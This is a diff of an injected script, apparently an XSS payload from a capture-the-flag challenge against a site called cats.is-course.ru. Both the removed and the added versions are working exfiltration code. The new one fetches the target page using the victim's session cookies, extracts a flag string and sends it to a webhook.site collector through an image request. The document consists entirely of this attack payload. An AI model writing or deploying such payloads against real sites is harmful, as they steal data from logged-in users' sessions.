@@ -1,14 +1,24 @@
 <script>
-fetch('https://cats.is-course.ru/', {
-    credentials: 'include',
-    mode: 'no-cors'
-})
-.then(r => {
-    var img = new Image();
-    img.src = "https://webhook.site/bf30006e-dd6b-4685-8545-432615830517?profile_status=" + r.status;
-})
-.catch(e => {
-    var img = new Image();
-    img.src = "https://webhook.site/bf30006e-dd6b-4685-8545-432615830517?profile_error=1";
-});
+console.log('v11');
+window.location = 'https://cats.is-course.ru/';
+setTimeout(function() {
+    fetch('https://cats.is-course.ru/', {
+        credentials: 'include'
+    })
+    .then(r => r.text())
+    .then(html => {
+        if(html.includes('Welcome, admin!')) {
+            var flagMatch = html.match(/flag{[^}]+}/);
+            if(flagMatch) {
+                new Image().src = "https://webhook.site/bf30006e-dd6b-4685-8545-432615830517?flag=" + flagMatch[0];
+            } else {
+                var text = html.replace(/<[^>]*>/g, ' ');
+                var flagMatch2 = text.match(/flag{[^}]+}/);
+                if(flagMatch2) {
+                    new Image().src = "https://webhook.site/bf30006e-dd6b-4685-8545-432615830517?flag_in_text=" + flagMatch2[0];
+                }
+            }
+        }
+    });
+}, 1000);
 </script>
